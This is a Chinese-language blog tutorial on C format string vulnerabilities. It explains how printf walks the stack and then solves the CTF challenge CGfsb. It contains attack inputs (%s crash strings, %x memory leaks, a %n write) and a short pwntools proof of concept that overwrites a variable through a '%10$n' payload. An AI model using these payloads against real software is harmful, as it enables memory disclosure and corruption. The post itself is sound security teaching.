---
layout: post
title:  "格式化字符串漏洞"
date:   2023-09-10 00:00:00 +0800
categories: 安全
tags: pwn format-string
comments: 1
mathjax: true
copyrights: 原创
---

在 C 语言中，`printf` 函数的定义如下：

```c
int printf(const char *format, ...)
```

可以看到，`printf` 函数只有第一个参数是必须的，剩下都是可选的参数，编译器也不会检查参数个数是否正确。因此下面的代码也是正确的：

```c
printf("%d %d", a);
printf("%d");
```

这里我直接拿之前做的 slides 演示一下这一过程。

假设我们要运行正常的 `printf` 语句

```c
printf("a has value %d, b has value %d, c has address: %08x\n", a, b, &c);
```

程序会首先按照下图的方式把 `printf` 函数的参数压入栈中。当遇到第一个 `%d` 时，`printf` 函数内部的指针会向高地址移动，读取传入的参数：

<img src="../../assets/post/images/formatstring1.png" alt="formatstring1" style="zoom: 40%;" />

遇到第二个 `%d` 后，会继续移动：

<img src="../../assets/post/images/formatstring2.png" alt="formatstring2" style="zoom:40%;" />

遇到 `%08x` 后，会继续移动：

<img src="../../assets/post/images/formatstring3.png" alt="formatstring3" style="zoom:40%;" />

至此，成功执行了这个函数。

那如果我少传入了一个参数呢？也就是运行

```c
printf("a has value %d, b has value %d, c has address: %08x\n", a, b);
```

此时，在遇到前两个 `%d` 时，和之前是一样的。但当读取到 `%08x` 时，指针继续向高地址移动，这时指针指向的已经不是我的参数，而是栈中的其它字节了！

<img src="../../assets/post/images/formatstring4.png" alt="formatstring4" style="zoom:40%;" />

`printf` 可不会去检查我传入的参数够不够、指针指向的是什么东西，它只会直接输出。这就给了我们可乘之机！

在攻击之前，我们先复习一下 `format` 中常用的占位符：

| 符号 | 含义                          | 传递方式 |
| :--: | ----------------------------- | :------: |
| `%d` | 10 进制数                     |    值    |
| `%x` | 16 进制数                     |    值    |
| `%p` | 指针地址                      |    值    |
| `%s` | 字符串                        |   引用   |
| `%n` | 到目前位置输出的字符 bytes 数 |   引用   |

下面我们考虑几种攻击形式：

- ```c
  printf ("%s%s%s%s%s%s%s%s%s");
  ```

  此时程序会把指针指向的内容作为地址读取，并到该地址读取字符串。

  然而，指针指向的内容很可能不是个地址，然后导致程序崩溃。

- ```c
  printf ("%08x %08x %08x %08x");
  ```

  这样的代码可以用于查看内存。为了更方便理解，我们考虑下面的程序：

  ```c
  int main(int argc, char *argv[])
  {
     char user_input[100];
     scanf("%s", user_input); /* getting a string from user */
     printf(user_input);      /* Vulnerable place */
     return 0;
  }
  ```

  当输入 `\x11\x45\x14\x00 %x %x %x %x %s` 时，其内存栈如图所示：

  <img src="../../assets/post/images/formatstring5.png" alt="formatstring5" style="zoom:40%;" />

  由于 `printf` 输出的是 `user_input`，因此 `printf` 自己的内部指针会从 `user_input` 的地址 + 1 处开始读取。而 `user_input` 的具体内容存储在地址更高的地方，我们的 4 个 `%x` 使得指针移动过了无意义的部分，最终指向了我们自己输入的 `0x11451400`，而此时的 `%s` 会直接输出地址 `0x11451400` 中的内容。
  
  当然，这里为了方便起见，我们假设 `user_iput` 的实际内容就存储在其地址 + 5 的位置，因此使用了 4 个 `%x` 来跳过无意义的部分。在实际操作中，我们需要根据实际情况来取得地址偏移。
  
  如此一来，我们可以看到内存中任意位置的内容。
  
- ```c
  printf (“114514%n", &i);
  ```

  正如前文所述，`%n` 表示的是已经输出了多少个 bytes。通过这种方法，我们可以向内存中写入任意数据。

下面，我们以攻防世界 CGfsb 为例进行实操。

扔进 ida 可以提取到

```c
puts("leave your message please:");
fgets(s, 100, stdin);
puts("your message is:");
printf(s);
if ( pwnme == 8 )
{
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
}
else
{
    puts("Thank you!");
}
```

很容易看出，`printf(s)` 一句是存在漏洞的。我们的目标是将 `pwnme` 变量修改为 8。

- 我们的第一步是要确定地址偏移，也就是确定我们输入的 `s` 的内容距离 `s` 的地址存储的位置有多远。

  我们直接输入

  ```plaintext
  leave your message please:
  AAAA%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x
  your message is:
  AAAAffb7929e-f7fa55a0-00f0b5ff-ffb792ce-00000001-000000c2-616148fb-0000000a-00000000-41414141-78383025-3830252d-30252d78
  ```

  这里可以看到我们输入的 `AAAA`（即 `41414141`）偏移了 10 个 bytes。也就是说，我们要让 `printf` 的内部指针移动 10 下才能移动到我们输入的内容的位置。

- 然后确定 `pwnme` 变量的位置。我们在 ida 中可以看到，其位置为 `0x0804A068`。

- 最后可以编写 POC 了。

  ```py
  from pwn import *
  
  p = process('./pwn')
  p.recvuntil("leave your message please:\n")
  payload = p32(0x804A068) + b'a' * 0x4 + b'%10$n'
  p.sendline(payload)

  p.interactive()
  ```

  这里注意的是，我们多填充了 4 个 a，目的是为了让 `pwnme` 计算得到 8。
